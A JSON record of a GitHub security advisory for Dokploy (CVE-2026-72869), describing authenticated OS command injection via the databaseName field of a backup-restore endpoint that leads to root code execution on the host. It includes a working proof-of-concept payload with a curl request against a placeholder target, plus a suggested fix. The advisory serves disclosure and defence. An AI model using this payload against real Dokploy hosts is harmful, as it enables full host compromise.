@@ -1,0 +1,51 @@
+{
+  "global": null,
+  "id": "GHSA-f7mp-9jfp-mjrr",
+  "repo": {
+    "cve_id": "CVE-2026-72869",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-77",
+      "CWE-78"
+    ],
+    "description": "### Summary\r\nAn authenticated user with the `backup:restore` permission can execute arbitrary OS commands on the Dokploy **host** via the `databaseName` parameter of the `backup.restoreBackupWithLogs` tRPC subscription. The injected command runs on the host shell *before* `docker exec` is invoked, so container isolation is bypassed entirely.\r\n\r\n### Affected version\r\nConfirmed on **v0.29.7** (latest). Present for all four database engines (PostgreSQL, MariaDB, MySQL, MongoDB).\r\n\r\n### Details\r\n`packages/server/src/utils/restore/utils.ts` interpolates `databaseName` **unquoted** into a command passed to Node.js `exec()` on the host:\r\n\r\n```ts\r\n// getPostgresRestoreCommand (identical pattern for mariadb/mysql/mongo)\r\nreturn `docker exec -i $CONTAINER_ID sh -c \"pg_restore -U '${databaseUser}' -d ${database} -O --clean --if-exists\"`;\r\n//                                                                          ^^^^^^^^^^ unquoted\r\n```\r\n\r\n`databaseName` is validated only as `z.string().min(1)` (no pattern) in `packages/server/src/db/schema/backups.ts`. The host `/bin/sh` evaluates `$(...)` during expansion, so the payload runs even if the downstream rclone/docker steps fail.\r\n\r\n### Proof of Concept\r\n`databaseName` payload:\r\n\r\n```\r\n$(id > /tmp/dokploy_rce_proof.txt)\r\n```\r\n\r\n```bash\r\nINPUT=$(python3 -c \"import urllib.parse,json; print(urllib.parse.quote(json.dumps({'json':{'databaseId':'PG_ID','databaseType':'postgres','backupType':'database','databaseName':'\\$(id > /tmp/dokploy_rce_proof.txt)','backupFile':'x.sql.gz','destinationId':'DEST_ID'}})))\")\r\ncurl -s --no-buffer -H \"Cookie: better-auth.session_token=SESSION\" \\\r\n  -H \"Accept: text/event-stream\" -H \"Origin: http://TARGET:3000\" \\\r\n  \"http://TARGET:3000/api/trpc/backup.restoreBackupWithLogs?input=$INPUT\"\r\n```\r\n\r\nThe SSE stream emits an `\"Executing command:\"` event containing the injected literal, and the file is written as root:\r\n\r\n```\r\n... | docker exec -i $CONTAINER_ID sh -c \"pg_restore -U 'pguser' -d $(id > /tmp/dokploy_rce_proof.txt) -O --clean --if-exists\"\r\n\r\n$ cat /tmp/dokploy_rce_proof.txt\r\nuid=0(root) gid=0(root) groups=0(root)\r\n```\r\n\r\n### Impact\r\nRemote code execution as root on the Dokploy host (the command runs on the host shell, not inside a container). Full host compromise via the bind-mounted Docker socket.\r\n\r\n### Suggested fix\r\nAdd pattern validation and single-quote the value:\r\n\r\n```ts\r\n// schema\r\ndatabaseName: z.string().min(1).regex(/^[a-zA-Z0-9_-]+$/)\r\nbackupFile:   z.string().min(1).regex(/^[a-zA-Z0-9_.-]+$/)\r\n// utils.ts: -d '${database}'  (quote all four restore commands)\r\n```\r\n",
+    "ghsa_id": "GHSA-f7mp-9jfp-mjrr",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-f7mp-9jfp-mjrr",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-f7mp-9jfp-mjrr"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72869"
+      }
+    ],
+    "published_at": "2026-07-21T23:24:19Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Authenticated OS command injection in backup.restoreBackupWithLogs (databaseName) leading to host RCE",
+    "updated_at": "2026-08-10T18:39:46Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= 0.29.7"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
